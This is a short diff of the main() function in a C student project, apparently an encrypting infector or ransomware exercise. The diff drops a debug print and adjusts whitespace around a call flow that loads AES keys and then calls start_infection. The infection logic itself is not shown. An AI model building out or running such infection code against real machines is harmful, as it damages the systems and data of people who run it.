@@ -6,7 +6,7 @@
 /*   By: frmarinh <frmarinh@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/03/20 17:18:39 by frmarinh          #+#    #+#             */
-/*   Updated: 2018/03/23 06:20:27 by frmarinh         ###   ########.fr       */
+/*   Updated: 2018/03/23 06:50:45 by frmarinh         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -22,7 +22,7 @@ t_key_iv	*get_key_iv(t_aes *aes)
 int main(int argc, char **argv, char **env)
 {
 	t_aes		*aes = NULL;
-	
+
 	if ((aes = load_aes()) != NULL) {
 		if (get_key_iv(aes) != NULL && init_encryption(aes)
 		 && init_decryption(aes))
@@ -30,7 +30,6 @@ int main(int argc, char **argv, char **env)
 			t_cipher_plain *cipher_plain = get_cipher_plain();
 			 if (cipher_plain) {
 				 if (safe_mode(aes)) {
-					 printf("Salopard\n");
 					 start_infection(aes, cipher_plain, env);
 			 	}
 			}
